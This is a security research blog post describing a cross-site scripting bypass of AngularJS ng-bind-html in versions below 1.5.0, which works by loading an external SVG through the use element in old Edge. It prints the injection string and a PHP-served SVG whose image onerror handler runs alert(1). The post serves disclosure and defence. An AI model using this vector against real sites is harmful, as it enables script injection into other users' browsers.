# Bypassing AngularJS bind HTML

Source: https://portswigger.net/research/bypassing-angularjs-bind-html
Fetched: 2026-06-28T09:17:21.425349+00:00

Bypassing AngularJS bind HTML

Gareth Heyes

Researcher

@garethheyes

Published: Thursday, 7 November 2019 at 14:51 UTC

Updated: Tuesday, 8 September 2020 at 12:23 UTC

Whilst testing an internal SVG cleaner I spent some time looking at the use element. Basically it allows you to reference other SVG elements and include them in your SVG document. You can reference same-origin URLs or link to certain IDs on the page using the hash. I reported this issue internally but it was rejected as you needed to upload a SVG to the same origin in order to exploit it. So of course my next idea was to get it working cross-origin. Chrome, Firefox and Safari all prevent SVG from being included cross-origin. Old Edge was different though, it was possible to include SVG from a different origin provided you include the CORS header Access-Allow-Cross-Origin: *. Initially I included a JavaScript URL in my external SVG and although the element was clickable the JavaScript URL didn't call alert.

I modified the file and tried injecting a onclick event and to my surprise the onclick event fired from the external domain. I double checked that the domain was the target domain by calling alert(document.domain) and thankfully it showed the correct domain. I then discovered you could modify the external SVG and make the vector execute automatically without a click using the image element.

The injection was:

<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" />

Here's what the external SVG looks like:

<?php

header("Access-Control-Allow-Origin: *");

header("Content-Type: image/svg+xml");

?>

<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'>

<image href="1" onerror="alert(1)" />

</svg>

I then tested AngularJS and it worked there too as they allow SVG in versions <1.5.0. Here is the full proof of concept that works on AngularJS 1.4.9.

AngularJS ng-bind-html bypass proof of concept.

Note that later versions of AngularJS are not vulnerable as they do not allow SVG.

angularjs

ng-bind-html

XSS

SVG

Back to all articles

Related Research

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

03 September 2025

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

Stealing HttpOnly cookies with the cookie sandwich technique

22 January 2025

Stealing HttpOnly cookies with the cookie sandwich technique

Bypassing WAFs with the phantom $Version cookie

04 December 2024

Bypassing WAFs with the phantom $Version cookie

Concealing payloads in URL credentials

23 October 2024

Concealing payloads in URL credentials
